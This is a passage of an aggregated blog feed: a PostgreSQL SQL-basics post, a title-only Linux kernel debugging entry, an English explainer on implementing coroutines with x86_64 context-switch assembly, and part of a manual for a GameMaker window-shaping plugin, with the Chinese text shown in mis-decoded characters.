<p>\conninfoï¼šåˆ—å‡ºå½“å‰æ•°æ®åº“å’Œè¿æ¥çš„ä¿¡æ¯ã€‚</p>
</blockquote>
<p><strong>æ•°æ®åº“æ“ä½œ</strong></p>
<p><em>é‡‡ç”¨åŸºæœ¬sqlè¯­æ³•</em></p>
<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="o">#</span> <span class="err">å»ºè¡¨</span>
<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="k">IF</span> <span class="k">NOT</span> <span class="k">EXISTS</span> <span class="k">user</span> <span class="p">(</span>
	<span class="n">id</span> <span class="nb">SERIAL</span> <span class="k">PRIMARY</span> <span class="k">KEY</span><span class="p">,</span>
    <span class="n">name</span> <span class="nb">TEXT</span> <span class="k">NOT</span> <span class="k">NULL</span>
<span class="p">);</span>

<span class="o">#</span> <span class="err">æ’å…¥</span>
<span class="k">INSERT</span> <span class="k">INTO</span> <span class="k">user</span> <span class="p">(</span><span class="n">name</span><span class="p">)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">);</span>

<span class="o">#</span> <span class="err">é€‰æ‹©</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="k">user</span><span class="p">;</span>

<span class="o">#</span> <span class="err">æ›´æ–°</span>
<span class="k">UPDATE</span> <span class="k">user</span> <span class="k">SET</span> <span class="n">name</span> <span class="o">=</span> <span class="s1">&#39;qwer&#39;</span> <span class="k">WHERE</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

<span class="o">#</span> <span class="err">åˆ é™¤</span>
<span class="k">DELETE</span> <span class="k">FROM</span> <span class="k">user</span> <span class="k">WHERE</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

<span class="o">#</span> <span class="err">æ·»åŠ æ ä½</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="k">ADD</span> <span class="n">gender</span> <span class="nb">VARCHAR</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>

<span class="o">#</span> <span class="err">æ›´æ–°è¡¨ç»“æ„</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="k">ALTER</span> <span class="k">COLUMN</span> <span class="n">gender</span> <span class="k">SET</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">;</span>

<span class="o">#</span> <span class="err">å­—æ®µæ›´å</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="k">RENAME</span> <span class="k">COLUMN</span> <span class="n">name</span> <span class="k">TO</span> <span class="n">username</span><span class="p">;</span>

<span class="o">#</span> <span class="err">åˆ é™¤å­—æ®µ</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="k">DROP</span> <span class="k">COLUMN</span> <span class="n">gender</span><span class="p">;</span>

<span class="o">#</span> <span class="err">è¡¨åæ›´æ”¹</span>
<span class="k">ALTER</span> <span class="k">TABLE</span> <span class="k">user</span> <span class="k">RENAME</span> <span class="k">TO</span> <span class="n">users</span><span class="p">;</span>

<span class="o">#</span> <span class="err">åˆ é™¤è¡¨æ ¼</span>
<span class="k">DROP</span> <span class="k">TABLE</span> <span class="n">users</span><span class="p">;</span>
</code></pre></div><h2 id="ç›¸å…³é“¾æ¥">ç›¸å…³é“¾æ¥</h2>
<blockquote>
<p><a href="http://www.ruanyifeng.com/blog/2013/12/getting_started_with_postgresql.html">PostgreSQLæ–°æ‰‹å…¥é—¨</a></p>
</blockquote>]]></content>
        <author>
            <name><![CDATA[Creedowlâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://doublemice.github.io/linux%E5%86%85%E6%A0%B8gdb+qemu%E8%B0%83%E8%AF%95/</id>
        <title><![CDATA[Linuxå†…æ ¸gdb+qemuè°ƒè¯•]]></title>
        <updated>2019-01-28T00:00:00+08:00</updated>
        <link href="https://doublemice.github.io/linux%E5%86%85%E6%A0%B8gdb+qemu%E8%B0%83%E8%AF%95/"/>
        <content type="text/html" src="https://doublemice.github.io/linux%E5%86%85%E6%A0%B8gdb+qemu%E8%B0%83%E8%AF%95/"><![CDATA[Linuxå†…æ ¸gdb+qemuè°ƒè¯•]]></content>
        <author>
            <name><![CDATA[DoubleMice]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://invariant.me/coroutines-part-1-lightweight-threads-for-concurrency/</id>
        <title><![CDATA[Coroutines: Lightweight Threads for Concurrency]]></title>
        <updated>2019-01-12T16:00:00+08:00</updated>
        <link href="https://invariant.me/coroutines-part-1-lightweight-threads-for-concurrency/"/>
        <content type="text/html" src="https://invariant.me/coroutines-part-1-lightweight-threads-for-concurrency/"><![CDATA[<img src="https://images.unsplash.com/photo-1501820434261-5bb046afcf6b?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=2000&fit=max&ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Coroutines: Lightweight Threads for Concurrency"><p><strong>Outdated:</strong> This post was written in January, 2019 and is not currently maintained.</p><!--kg-card-begin: html--><hr><!--kg-card-end: html--><p>In concurrent applications, we need a way to allow different tasks to make progress at the â€œsameâ€ time, which is known as concurrency. The most widely-used technology for concurrency is threads, the minimal execution unit provided by the operating system. However, there is a non-negligible overhead associated with multi-threading, especially when the threads are only performing small, lightweight tasks.</p><p>Multithreading overhead comes from how threads are implemented in operating systems. In Linux, a thread is just a "lightweight" process that shares resources, like virtual memory, with its parent process. When a thread yields control and begins to wait on an event to wake up, the operating system will take over control, find the next suitable process to run, and switch to that process, just like what it would do with normal processes. This introduces a significant overhead for many kinds of multithread applications, especially those requiring frequent message passing between threads. Additionally, when a thread is created or destroyed, the operating system has to initialize or destroy the thread control block (TCB, <code>task_struct</code> in Linux), which is a non-trivial operation.</p><p>Coroutine is a mechanism for reducing multithreading overheads. As a userspace equivalent of threads, coroutines are managed entirely in userspace and is opaque to the underlying OS.</p><h2 id="stackless-coroutines">Stackless Coroutines</h2><p>There are two types of coroutine systems, stackless and stackful. A stackless coroutine system is usually implemented with some kind of language-level transformations, like the CPS (Continuation Passing Style) transformation. A program in CPS form, as its name suggests, instead of passing the results of computations by return values, passes them by â€œcontinuationsâ€, which looks like:</p><pre><code>// Original form
let a = f1()
let b = f2(a)
print(b)

// CPS form
f1(
    a =&gt; f2(
        a,
        b =&gt; print(b)
    )
)
</code></pre><p>The code above looks like the ancient JavaScript callback pattern, doesn't it? JavaScript is by design single threaded and asynchronous, and blocking operations have to be implemented with callbacks. In fact, this kind of callbacks is an explicit form of CPS, regardless of whether <code>Promise</code> is used to avoid problems like <a href="https://en.wiktionary.org/wiki/callback_hell">callback hell</a>. To simplify programming, <code>async/await</code> syntax is introduced later, which enables users to write code that looks synchronous but is in fact asynchronous, and is usually implemented with automatic CPS transformation.</p><p>Another approach to stackless coroutine is to make use of a big <code>switch</code> loop:</p><pre><code>// Original form
int f1(int a) {
    int i, v = 0;
    for(i = 0; i &lt; a; i++) v += i;
    return v;
}

// Stackless coroutine
struct Local {
    int i;
    int v;
};
int f1(int a, int state, struct Local *local, int *out) {
    switch(state) {
        case 0:
            local-&gt;i = 0;
            local-&gt;v = 0;
            return 1;
        case 1:
            if(local-&gt;i &lt; a) {
                local-&gt;v += local-&gt;i;
                local-&gt;i++;
                return 1;
            } else {
                *out = local-&gt;v;
                return -1;
            }
    }
}
</code></pre><p>In the code above, we maintain the execution state of <code>f1</code> outside of itself, therefore allowing recovery of its execution at any point of time as long as we preserve <code>state</code> and <code>local</code>.</p><h2 id="stackful-coroutines">Stackful Coroutines</h2><p>Stackless coroutines are â€œstacklessâ€ because they do not explicitly preserve the call stack, while stackful coroutine systems allocate a new call stack for each coroutine. Compared to stackless coroutines, stackful coroutines usually do not need language-level transformations, making it easier to be integrated into different programming languages.</p><p>When the OS switches tasks, it needs to save the machine state of the old task and load the new taskâ€™s one. A machine state contains all used registers, along with in-memory data that should be preserved, e.g. the call stack. As we are going to do coroutine switching in userspace, we have to manually implement the logic for switching machine states.</p><p>For convenience, in this section, we assume that our platform is Linux on a x86_64 machine and we are implementing cooperative scheduling. Therefore, we need to follow the x86_64 System V ABI when dealing with calling conventions. The ABI specifies that the registers <code>rbx</code>, <code>rbp</code>, <code>r12</code>, <code>r13</code>, <code>r14</code> and <code>r15</code> are callee saved, so they must be saved before switching to another coroutine.</p><p>Letâ€™s start from the coroutine switching function:</p><pre><code>asm(
    "_co_switch:\n"
    "push %rbx\n"
    "push %rbp\n"
    "push %r12\n"
    "push %r13\n"
    "push %r14\n"
    "push %r15\n"
    "mov (%rdi), %rax\n"
    "mov %rsp, (%rdi)\n"
    "mov %rax, %rsp\n"
    "pop %r15\n"
    "pop %r14\n"
    "pop %r13\n"
    "pop %r12\n"
    "pop %rbp\n"
    "pop %rbx\n"
    "ret\n"
);
</code></pre><p>The <code>co_switch</code> function pushes all current callee-saved registers onto the current stack, swaps <code>(%rdi)</code> (the memory pointed to by the first argument, target stack address here) with the stack pointer <code>%rsp</code>, loads the callee-saved registers of the target coroutine, and then executes <code>ret</code> to return in the target coroutine.</p><p>Suppose we have a coroutine <code>A</code> that has just executed the instruction <code>mov %rax, %rsp</code>. At this point, we are sure that the old stack, which is swapped out into memory location <code>(%rdi)</code>, has the following layout (from lower address to higher address):</p><pre><code>[r15] [r14] [r13] [r12] [rbp] [rbx] [return_address]
</code></pre><p>A coroutine can only be switched out with <code>co_switch</code>, so its stack must have the same layout. Therefore, since we are already on the target stack after executing <code>mov %rax, %rsp</code>, we can pop the saved registers in the reverse order, from <code>r15</code> to <code>rbx</code>. Then, the <code>ret</code> instruction is executed, which pops the return address and jumps to it, and the caller code on the target coroutine observes a normal return from <code>co_switch</code>.</p><p>However, we just assumed that we already have a coroutine switched out previously, and some other logic is required for starting a new coroutine.</p><p>We have to construct the stack layout:</p><pre><code>[r15] [r14] [r13] [r12] [rbp] [rbx] [return_address]
</code></pre><p>The values of the saved registers can be arbitrary, since thereâ€™s no old registers to save. To construct a valid â€œreturnâ€ address, a trampoline is needed:</p><pre><code>asm(
    "_pre_call_entry:\n"
    "pop %rax\n" // entry
    "pop %rdi\n" // userdata
    "call *%rax\n"
    "ud2\n"
);
</code></pre><p><code>pre_call_entry</code> pops a function pointer <code>entry</code> and the associated <code>userdata</code> from the stack, calls <code>entry</code> with <code>userdata</code> as its only argument, then executes <code>ud2</code> to indicate <code>entry</code> should never return. Therefore, we need to include <code>entry</code> and <code>userdata</code> in our stack construction:</p><pre><code>[r15] [r14] [r13] [r12] [rbp] [rbx] [return_address] [entry] [userdata]
</code></pre><p>With the two assembly functions and the expected stack layout, now we can write the code to start a coroutine:</p><pre><code>void co_switch(void **stack);
void pre_call_entry();

struct Coroutine;

typedef void (*CoEntry)(struct Coroutine *co);

struct Coroutine {
    void *stack;
    CoEntry entry;
    int terminated;
};

void call_entry(struct Coroutine *co) {
    co_switch(&amp;co-&gt;stack);
    co-&gt;entry(co);
    co-&gt;terminated = 1;
    co_switch(&amp;co-&gt;stack);
}

void start_coroutine(struct Coroutine *co) {
    void **stack = (void **) co-&gt;stack;

    *(--stack) = co;
    *(--stack) = call_entry; // 16-byte aligned

    *(--stack) = pre_call_entry;

    *(--stack) = 0;
    *(--stack) = 0;
    *(--stack) = 0;
    *(--stack) = 0;
    *(--stack) = 0;
    *(--stack) = 0;

    co-&gt;stack = (void *) stack;

    co_switch(&amp;co-&gt;stack);
}
</code></pre><p>The full example code is available on my <a href="https://gist.github.com/losfair/60af3f0c565470e305b6c021ce57e3dc">GitHub Gist</a>.</p><h1 id="optimizations-and-tricks">Optimizations and Tricks</h1><ul><li><code>ret</code> in <code>co_switch</code> can be replaced by an explicit <code>pop</code> and <code>jmp</code> to avoid <a href="https://stackoverflow.com/questions/22442766/return-address-prediction-stack-buffer-vs-stack-stored-return-address">return address prediction failures</a>.</li><li>If your coroutines are extremely lightweight and usually use a very small space on the stack, we can use a fixed memory region as the execution stack (â€œshared stackâ€) and copy in/out the used range (<code>stack_end - sp</code>) of the coroutine stack when switching in/out of a coroutine. Although memory copying is needed, this approach can save a lot of memory while still allowing to use guard pages to ensure safety.</li><li>To implement cross-platform stackful coroutines without writing assembly, the <code>pthread_*</code> functions can be used along with <code>setjmp</code> and <code>longjmp</code> to initialize the machine state on a new stack and switch between stacks, without actually using OS threads.</li></ul>]]></content>
        <author>
            <name><![CDATA[The Invariant]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/foxwinshave2.html</id>
        <title><![CDATA[FoxWinShave 2 ä¸­æ–‡ä½¿ç”¨æ‰‹å†Œ]]></title>
        <updated>2019-01-12T08:45:27+08:00</updated>
        <link href="https://www.noisyfox.io/foxwinshave2.html"/>
        <content type="text/html" src="https://www.noisyfox.io/foxwinshave2.html"><![CDATA[<p>FoxWinShave 2 ç°å·²ä¸Šæ¶ GameMaker: Marketplaceï¼Œæ”¯æŒ GM8, GMS 1.4 å’Œ GMS 2ã€‚<a href="https://marketplace.yoyogames.com/assets/7696/foxwinshave" target="_blank" rel="noreferrer noopener" aria-label="ï¼ˆåœ¨æ–°çª—å£æ‰“å¼€ï¼‰">ç‚¹æ­¤ä»Marketplaceä¸‹è½½æœ€æ–°ç‰ˆæœ¬</a>ã€‚</p>



<hr class="wp-block-separator"/>



<h2>0. å‰ç½®æ¡ä»¶</h2>



<ul><li>ä»…æ”¯æŒ Windows å¹³å°ã€‚</li><li>æ”¯æŒ Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10ã€‚</li><li>æ”¯æŒ GameMaker 7, GameMaker 8, GameMaker 8.1, GameMaker Studio 1.4.x, GameMaker Studio 2 Desktopã€‚</li></ul>



<hr class="wp-block-separator"/>



<h2>1. å®‰è£…æ’ä»¶</h2>



<h3>1.0 GM 7, 8, 8.1</h3>



<p>èœå•æ  File-&gt; Import Resources&#8230; é€‰æ‹© FoxWinShave-GM8.gmres å¯¼å…¥æ’ä»¶åŠ Demoã€‚</p>



<ul><li>åœ¨å¼¹å‡ºçš„ Importing Resources å¯¹è¯æ¡†ä¸­ï¼Œè¯·åŠ¡å¿…å‹¾é€‰ Scripts å’Œ Include Files ä»¥å¯¼å…¥æ’ä»¶è¿è¡Œæ‰€å¿…é¡»çš„æ–‡ä»¶å’Œè„šæœ¬ã€‚</li><li>å¦‚éœ€åŒæ—¶å¯¼å…¥ Demo ä»£ç åŠç´ æï¼Œè¯·å°† Spritesï¼ŒObjects å’Œ Rooms ä¸€å¹¶å‹¾é€‰ä¸Šã€‚</li></ul>



<h3>1.1 GMS 1.4.x åŠ GMS 2 Desktop</h3>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-300x189.png" alt="" class="wp-image-569" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/image-300x189.png 300w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-768x483.png 768w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-1024x644.png 1024w, https://www.noisyfox.io/wp-content/uploads/2019/01/image.png 1588w" sizes="(max-width: 300px) 100vw, 300px" /></a><figcaption>Import resources: FoxWinShave å¯¹è¯æ¡†</figcaption></figure></div>



<ol><li>åœ¨ GameMaker: Marketplace ä¸Šè´­ä¹°æœ¬æ’ä»¶ã€‚<a rel="noreferrer noopener" aria-label="ï¼ˆåœ¨æ–°çª—å£æ‰“å¼€ï¼‰" href="https://marketplace.yoyogames.com/assets/7696/foxwinshave" target="_blank">ï¼ˆç‚¹æ­¤è´­ä¹°ï¼‰</a></li><li>åœ¨ GMS ä¸­èœå•æ é€‰æ‹© Marketplace -&gt; MyLibraryï¼Œæ‰¾åˆ° FoxWinShaveï¼Œç‚¹å‡» Downloadã€‚</li><li>ä¸‹è½½å®Œæˆåï¼Œç‚¹å‡» Importã€‚</li><li>åœ¨å¼¹å‡ºçš„ Import resources: FoxWinShave å¯¹è¯æ¡†ä¸­ï¼Œé€‰ä¸­ Scripts å’Œ Included Filesï¼Œç„¶åç‚¹å‡»ä¸­é—´çš„ Add æŒ‰é’®ä»¥å¯¼å…¥æ’ä»¶è¿è¡Œæ‰€å¿…é¡»çš„æ–‡ä»¶å’Œè„šæœ¬ã€‚</li><li>å¦‚éœ€åŒæ—¶å¯¼å…¥ Demo ä»£ç åŠç´ æï¼Œé‚£å°±ç›´æ¥ç‚¹å‡»ä¸­é—´çš„ Add All æŒ‰é’®ã€‚</li><li>ç‚¹å‡»å·¦ä¸‹è§’ Import æŒ‰é’®å®Œæˆæ’ä»¶çš„å¯¼å…¥ã€‚</li></ol>



<hr class="wp-block-separator"/>



<h2>2. æ’ä»¶å…¥é—¨ 101</h2>



<h3>2.0 åŸºç¡€å‡†å¤‡</h3>



<p>è¯·åŠ¡å¿…åœ¨æ¸¸æˆè®¾ç½®ä¸­å°†çª—å£è®¾ç½®ä¸ºæ— è¾¹æ¡†ï¼ˆborderless windowï¼‰:</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image-2.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-2-300x240.png" alt="" class="wp-image-592" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/image-2-300x240.png 300w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-2.png 512w" sizes="(max-width: 300px) 100vw, 300px" /></a><figcaption>GM 8 è®¾ç½®æ— è¾¹æ¡†</figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/image-1.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/image-1-300x237.png" alt="" class="wp-image-591" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/image-1-300x237.png 300w, https://www.noisyfox.io/wp-content/uploads/2019/01/image-1.png 695w" sizes="(max-width: 300px) 100vw, 300px" /></a><figcaption>GMS 2 è®¾ç½®æ— è¾¹æ¡†</figcaption></figure></div>



<p>ç¨åå°†ä¼šè§£é‡Šéœ€è¦è®¾ç½®ä¸ºæ— è¾¹æ¡†çš„åŸå› ã€‚</p>



<h3>2.1 æ’ä»¶åˆå§‹åŒ–</h3>



<p>ä½¿ç”¨æœ¬æ’ä»¶çš„ä»»ä½•è„šæœ¬å‰éœ€è¦å…ˆè¿›è¡Œæ’ä»¶çš„åˆå§‹åŒ–ã€‚å»ºè®®åœ¨é¦–ä¸ª Room çš„ Creation Code å†…æˆ–è€…æŸä¸ªæ§åˆ¶ç”¨çš„ Object çš„ Game Start äº‹ä»¶é‡Œæ‰§è¡Œï¼š</p>


<pre class="brush: cpp; title: ; notranslate">
NF_WS_Init();
</pre>


<p>æ’ä»¶åˆå§‹åŒ–åè¯·å‹¿å†æ¬¡è°ƒç”¨è¯¥å‡½æ•°ã€‚</p>



<h3>2.2 æ’ä»¶é‡Šæ”¾</h3>



<p>å½“ä¸å†éœ€è¦æ›´æ”¹çª—å£å½¢çŠ¶åï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹å‡½æ•°å°†æ’ä»¶å¸è½½ä»¥é‡Šæ”¾èµ„æºï¼š</p>


<pre class="brush: cpp; highlight: [2]; title: ; notranslate">
NF_WS_ResetWindow(); // é‡ç½®çª—å£å½¢çŠ¶ä¸ºé»˜è®¤ï¼Œéå¿…è¦
NF_WS_Free(); // é‡Šæ”¾æ’ä»¶
</pre>


<p>åœ¨é‡Šæ”¾æ’ä»¶åå¦‚æœéœ€è¦å†æ¬¡ä½¿ç”¨æœ¬æ’ä»¶ï¼Œéœ€è¦é‡æ–°è¿›è¡Œæ’ä»¶çš„åˆå§‹åŒ–ã€‚</p>



<h3>2.3 åŸºç¡€åŸç†è§£é‡Š</h3>



<h4>2.3.0 çª—å£åæ ‡ç³»</h4>



<p>å°†æ¸¸æˆçª—å£æƒ³è±¡æˆä¸€ä¸ªç”»å¸ƒï¼ŒæŒ‰ç…§çª—å£çš„è¾¹æ¡†å¼€å§‹ç®—å·¦ä¸Šè§’åæ ‡ä¸º (0, 0)ï¼Œå³ä¸‹è§’è¾¹æ¡†æœ€å¤–å¤„åæ ‡ä¸º (viewport_width + å·¦è¾¹æ¡†å®½ + å³è¾¹æ¡†å®½, viewport_height + ä¸Šè¾¹æ¡†é«˜ + ä¸‹è¾¹æ¡†é«˜)ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1.png" alt="" class="wp-image-635" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1.png 574w, https://www.noisyfox.io/wp-content/uploads/2019/01/win-coord-1-300x234.png 300w" sizes="(max-width: 574px) 100vw, 574px" /></a><figcaption> <br>çª—å£åæ ‡ç³»ç»Ÿ </figcaption></figure></div>



<p>ç„¶è€Œé—®é¢˜åœ¨äºçª—å£çš„è¾¹æ¡†å®½åº¦æ˜¯ç”± Windows ç³»ç»Ÿå®šä¹‰çš„ï¼Œä¸åŒ Windows ç‰ˆæœ¬æˆ–è€…ä¸åŒçš„ä¸»é¢˜éƒ½æœ‰å¯èƒ½å¸¦æœ‰ä¸åŒå°ºå¯¸çš„è¾¹æ¡†ï¼Œç»™åœ¨å®šä¹‰çª—å£çš„å½¢çŠ¶æ—¶è®¡ç®—åæ ‡å¸¦æ¥äº†éº»çƒ¦ã€‚å› æ­¤å¦‚ä¸Šæ–‡æ‰€è¿°ï¼Œè¯·<strong>åŠ¡å¿…</strong>åœ¨æ¸¸æˆå…¨å±€è®¾ç½®ä¸­å…³é—­çª—å£è¾¹æ¡†çš„æ˜¾ç¤ºï¼Œè¿™æ ·çª—å£çš„åæ ‡ç³»ç»Ÿå°±å’Œæ¸¸æˆ View Port çš„åæ ‡ç³»ç»Ÿçš„åŸç‚¹èƒ½å¤Ÿç»Ÿä¸€ï¼Œä¾¿äºå°†çª—å£å½¢çŠ¶ä¸æ¸¸æˆç»˜åˆ¶å†…å®¹å¯¹é½ã€‚</p>



<p>ä¸‹æ–‡åœ¨æè¿°åæ ‡æ—¶å°†é»˜è®¤ä½¿ç”¨æ— è¾¹æ¡†çª—å£ã€‚</p>



<h4>2.3.1 æ¸¸æˆç»˜åˆ¶ä¸ View Port</h4>



<p>GM æ”¯æŒåœ¨ä¸€ä¸ªçª—å£ä¸­åŒæ—¶æ˜¾ç¤ºå¤šä¸ª View Portã€‚View Port çš„ä½œç”¨æ˜¯å°† Room çš„ä¸€éƒ¨åˆ†å†…å®¹æŒ‰ä¸€å®šæ¯”ä¾‹ã€ç¼©æ”¾å’Œä½ç§»æ˜ å°„åœ¨çª—å£ä¸­æ˜¾ç¤ºå‡ºæ¥ã€‚ç”¨æˆ·å®é™…çœ‹åˆ°çš„å†…å®¹æ˜¯ç»è¿‡ View Port å˜æ¢åçš„ç»“æœï¼Œå¹¶ä¸ï¼ˆä¸€å®šï¼‰æ˜¯æ¸¸æˆä¸­è°ƒç”¨ç»˜åˆ¶ä»£ç æ—¶ä½¿ç”¨çš„åæ ‡ã€‚</p>



<p>ç”±äºæˆ‘ä»¬åªå…³å¿ƒç”¨æˆ·å®é™…çœ‹åˆ°äº†ä»€ä¹ˆï¼Œå› æ­¤ä¸‹æ–‡ä¸­æåˆ°çš„<strong>â€œæ¸¸æˆç»˜åˆ¶å†…å®¹â€</strong>çš„å°ºå¯¸ã€åæ ‡ï¼Œçš†ä¸ºç»è¿‡ View Port å˜æ¢åæ˜ å°„åˆ°çª—å£åæ ‡ç³»ä¸­çš„å°ºå¯¸å’Œåæ ‡ã€‚</p>



<p>æ›´å¤šå…³äº View Port çš„å†…å®¹ï¼Œè¯·å‚è€ƒ GM å®˜æ–¹æ–‡æ¡£ï¼Œä¸‹æ–‡å°†ä¸å†èµ˜è¿°ã€‚</p>



<h4>2.3.2 çª—å£å½¢çŠ¶é®ç½©</h4>



<p>æœ¬æ’ä»¶é‡‡ç”¨é®ç½©å½¢å¼è®¾ç½®çª—å£å½¢çŠ¶ï¼Œæ”¯æŒæ ¹æ® Sprite å’Œ Surfaceï¼ˆä»…é™ GMSï¼‰è®¾ç½®çª—å£é®ç½©ã€‚ä»¥ä¸‹æ ¸å¿ƒå‡½æ•°</p>


<pre class="brush: cpp; title: ; notranslate">
NF_WS_ShaveWindow(sprite, subimage, x, y);
NF_WS_ShaveWindowAlpha(sprite, subimage, x, y, alpha);
NF_WS_ShaveWindowExt(sprite, subimage, x, y, xscale, yscale, alpha);
NF_WS_ShaveWindowSurfaceExt(surface, x, y, xscale, yscale, alpha); // ä»…é™ GMS
</pre>


<p>ä¸ draw_sprite_* ç³»åˆ—ç»˜åˆ¶å‡½æ•°æœ‰ç€ååˆ†ç±»ä¼¼çš„å½¢å¼ï¼Œé™¤äº†ä¸æ”¯æŒ rot å’Œ  <br>colourå‚æ•°ï¼ŒåŒæ—¶ alpha å‚æ•°æœ‰ä¸åŒçš„æ„ä¹‰ã€‚å¯ä»¥ç†è§£ä¸ºå°†ç»™å®šçš„ Sprite / Surface ç”¨æä¾›çš„å‚æ•°æ”¾ç½®äºçª—å£åæ ‡ç³»å†…ä½œä¸ºé®ç½©ï¼ˆä¸ç»è¿‡ View Port ç­‰ä»»ä½•å˜æ¢ï¼‰ï¼ŒåŒæ—¶å°†çª—å£æ²¡æœ‰è¢«é®ç½©è¦†ç›–çš„åŒºåŸŸç»™â€œæ¶ˆå»â€å˜ä¸ºé€æ˜ï¼š</p>



<div class="wp-block-image"><figure class="aligncenter"><a href="https://www.noisyfox.io/wp-content/uploads/2019/01/mask.png" target="_blank" rel="noreferrer noopener"><img src="https://www.noisyfox.io/wp-content/uploads/2019/01/mask.png" alt="" class="wp-image-654" srcset="https://www.noisyfox.io/wp-content/uploads/2019/01/mask.png 640w, https://www.noisyfox.io/wp-content/uploads/2019/01/mask-300x225.png 300w" sizes="(max-width: 640px) 100vw, 640px" /></a><figcaption>â€œé®ç½©å±‚â€å†…å®¹</figcaption></figure></div>



<p>å¦‚å›¾æ‰€ç¤ºï¼Œçº¢è‰²éƒ¨åˆ†çš„çª—å£ä¼šè¢«ä¿ç•™ä¸‹æ¥ï¼Œå…¶ä½™éƒ¨åˆ†å°†ä¼šè¢«æ¶ˆå»ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ä¸Šå›¾æ‰€è°“çš„â€œé®ç½©å±‚â€æ˜¯ä¸€ä¸ªä¸çª—å£åŒæ ·å¤§å°çš„ä½äºçª—å£ä¹‹ä¸Šçš„æƒ³è±¡å‡ºçš„ä¸€å±‚ï¼Œå¹¶ä¸æ˜¯å®é™…å­˜åœ¨çš„å¯è§å›¾å±‚ï¼Œå…¶å†…å®¹ä»…ä¸ºäº†ä½œä¸ºé®ç½©æ‰€ç”¨ï¼Œå¹¶ä¸ä¼šæ˜¾ç¤ºå‡ºæ¥ã€‚</p>



<p>é®ç½©å±‚ä½¿ç”¨çš„å›¾åƒä¸ºå½©è‰²å›¾åƒå¸¦ Alpha é€šé“ã€‚åœ¨å®é™…è¿è¡Œæ—¶è‰²å½©é€šé“ä¼šè¢«å®Œå…¨å¿½ç•¥ï¼Œæœ€ç»ˆçª—å£å½¢çŠ¶ä»…å—é®ç½©å±‚çš„ Alpha é€šé“å½±å“ã€‚é»˜è®¤æƒ…å†µä¸‹æ¯ä¸ª Alpha é€šé“å€¼ä¸º 0 çš„åƒç´ ï¼ˆå³çº¯é€æ˜åƒç´ ï¼‰è¢«è®¤ä¸ºæ˜¯çª—å£éœ€è¦è¢«æ¶ˆå»çš„éƒ¨åˆ†ã€‚è¿™ä¸ªå€¼å¯ä»¥é€šè¿‡ä¸Šæ–‡æ‰€è¿°çš„å‡ ä¸ªå‡½æ•°ä¸­çš„ alpha å‚æ•°ï¼ˆèŒƒå›´ [0, 1.0]ï¼‰æ¥æ”¹å˜ã€‚ä»»ä½• Alpha é€šé“å€¼ &lt;= è¯¥å‚æ•°çš„åƒç´ å°†è¢«è®¤ä¸ºæ˜¯éœ€è¦æ¶ˆå»çš„ã€‚æ³¨æ„ï¼Œè¿™æ„å‘³ç€å¦‚æœä½ ä¼ å…¥çš„ alpha å‚æ•°ä¸º 1ï¼Œåˆ™<strong>ä»»ä½•</strong>åƒç´ éƒ½ä¼šè¢«è®¤å®šä¸ºé€æ˜åƒç´ ã€‚</p>



<p>å¦å¤–ï¼Œå¦‚æœä½¿ç”¨ Surface æ¥ä¼ å…¥é®ç½©å†…å®¹ï¼Œè¯·æ³¨æ„ Surface çš„èƒŒæ™¯éœ€è¦ç”¨é€æ˜è‰²å¡«å……ï¼š</p>


<pre class="brush: cpp; highlight: [2]; title: ; notranslate">
surface_set_target(mask_surface);
draw_clear_alpha(c_white, 0); // Alpha = 0, ä½¿ç”¨çš„é¢œè‰²æ— æ‰€è°“.
</pre>


<h4>2.3.3 é®ç½©å¯¹é½</h4>



<p>ä½¿ç”¨æœ¬æ’ä»¶çš„ç›®çš„é€šå¸¸æ˜¯æƒ³å°†æ¸¸æˆçª—å£çš„å½¢çŠ¶ï¼Œè£å‰ªæˆæ¸¸æˆç»˜åˆ¶çš„æœ‰æ„ä¹‰çš„å†…å®¹çš„å½¢çŠ¶ï¼š</p>



